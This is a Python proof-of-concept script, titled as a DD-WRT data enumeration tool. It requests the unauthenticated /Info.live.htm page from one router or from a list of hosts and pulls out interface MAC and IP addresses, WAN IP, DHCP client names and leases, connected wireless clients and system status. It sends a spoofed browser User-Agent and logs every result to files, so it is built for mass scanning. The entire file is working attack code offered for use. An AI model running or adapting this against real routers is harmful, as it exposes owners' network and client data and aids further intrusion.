import requests
import argparse
import os
import re
from urllib.parse import urlparse
from datetime import datetime
import time

def pdl(dhcp_str):
    clients = []
    entries = re.split(r"','", dhcp_str.strip("'{}"))
    
    for i in range(0, len(entries) - 4, 5):
        try:
            name = entries[i].strip("' ")
            ip = entries[i+1].strip()
            mac = entries[i+2].strip()
            duration = entries[i+3].strip()
            clients.append({
                'name': name,
                'ip': ip,
                'mac': mac,
                'duration': duration
            })
        except IndexError:
            continue
    return clients

def paw(wireless_str):
    clients = []
    elements = re.split(r"','", wireless_str.strip("'{}"))
    
    for i in range(0, len(elements), 9):
        try:
            mac = elements[i].strip("'")
            signal = elements[i+5].strip()
            clients.append({'mac': mac, 'signal': signal})
        except IndexError:
            continue
    return clients

def pr(text):
    data = {}
    pattern = re.compile(r'\{(.*?)\}', re.DOTALL)
    matches = pattern.findall(text)
    
    for match in matches:
        if '::' in match:
            key, value = match.split('::', 1)
            data[key.strip()] = value.strip().replace('\n', '')
    return data

def fo(host_url, data, response_code):
    output = []
    output.append(f"[*] Host: {host_url}")
    output.append(f"[*] Status: {response_code} OK\n")

    output.append("[Network Interfaces]")
    output.append(f"• LAN MAC: {data.get('lan_mac', 'N/A').split('}')[0]}")
    output.append(f"• WAN MAC: {data.get('wan_mac', 'N/A').split('}')[0]}")
    output.append(f"• Wireless MAC: {data.get('wl_mac', 'N/A').split('}')[0]}")
    output.append(f"• LAN IP: {data.get('lan_ip', 'N/A').split('}')[0]}\n")
    
    output.append("[Wireless Details]")
    output.append(f"• Channel: {cv(data.get('wl_channel', 'N/A'))}")
    output.append(f"• Status: {cv(data.get('wl_radio', 'N/A'))}")
    output.append(f"• TX Power: {cv(data.get('wl_xmit', 'N/A'))}")
    output.append(f"• Speed: {cv(data.get('wl_rate', 'N/A'))}")
    output.append(f"• Mode: {cv(data.get('wl_mode_short', 'N/A')).upper()}\n")
    
    if 'packet_info' in data:
        packets = ppi(data['packet_info'])
        output.append("[Network Statistics]")
        output.append(f"• Received (Good): {packets.get('SWRXgoodPacket', 'N/A')}")
        output.append(f"• Received (Errors): {packets.get('SWRXerrorPacket', 'N/A')}")
        output.append(f"• Transmitted (Good): {packets.get('SWTXgoodPacket', 'N/A')}")
        output.append(f"• Transmitted (Errors): {packets.get('SWTXerrorPacket', 'N/A')}\n")
    
    if 'dhcp_leases' in data:
        output.append("[DHCP Clients]")
        for client in pdl(data['dhcp_leases']):
            output.append(f"- {client['name']} (IP: {client['ip']}, MAC: {client['mac']}, Lease: {client['duration']})")
    
    if 'active_wireless' in data:
        output.append("\n[Wireless Clients]")
        for client in paw(data['active_wireless']):
            output.append(f"- MAC: {client['mac']}, Signal Strength: {client['signal']} dBm")
    
    output.append("\n[System Status]")
    output.append(f"• Uptime: {cv(data.get('uptime', 'N/A')).replace('uptime::', '')}")
    output.append(f"• WAN IP: {cv(data.get('wan_ipaddr', 'N/A'))}")
    output.append(f"• Protocol: {cv(data.get('lan_proto', 'N/A')).upper()}")
    
    if 'mem_info' in data:
        mem_info = cv(data['mem_info'])
        mem_parts = [p.strip("', ") for p in mem_info.split(',')[:6] if ':' in p]
        output.append("\n[Memory Usage]")
        output.append(" | ".join(mem_parts))
    
    output.append("\n" + "-"*50 + "\n")
    return "\n".join(output)

def cv(value):
    return value.split('}')[0].strip("'{}\"")

def ppi(packet_str):
    return dict(item.split('=') for item in packet_str.split(';') if '=' in item)

def mr(host_url, save_to_file=True):
    try:
        parsed_url = urlparse(host_url)
        if not parsed_url.scheme:
            host_url = f"http://{host_url}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        }
        
        response = requests.get(f'{host_url}/Info.live.htm', headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = pr(response.text)
            output = fo(host_url, data, response.status_code)
            
            print(output)
            
            if save_to_file:
                filename = f"{parsed_url.netloc.replace(':', '_')}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(output)
                
                with open("all_servers.txt", 'a', encoding='utf-8') as f:
                    f.write(output)
                
            return True
        else:
            error_msg = f"[!] Host: {host_url} - Error {response.status_code}"
            print(error_msg)
            return False

    except Exception as e:
        error_msg = f"[!] Host: {host_url} - Error: {str(e)}"
        print(error_msg)
        return False

def phl(file_path):
    try:
        with open("all_servers.txt", 'w', encoding='utf-8') as f:
            f.write(f"Scan Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        
        with open(file_path, 'r') as f:
            hosts = [line.strip() for line in f if line.strip()]
        
        total = len(hosts)
        success = 0
        
        print(f"[*] Scanning {total} hosts...")
        
        for idx, host in enumerate(hosts, 1):
            print(f"\n[{idx}/{total}] Processing {host}")
            if mr(host):
                success += 1
            time.sleep(1)
        
        print(f"\n[*] Scan completed: {success}/{total} successful")
        
    except Exception as e:
        print(f"[!] Error: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description='DD-WRT Datas Enumeration - PoC')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='Single target URL')
    group.add_argument('-l', '--list', help='List of hosts file')
    args = parser.parse_args()
    
    try:
        if args.url:
            mr(args.url)
        elif args.list:
            phl(args.list)
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")

if __name__ == "__main__":
    main()
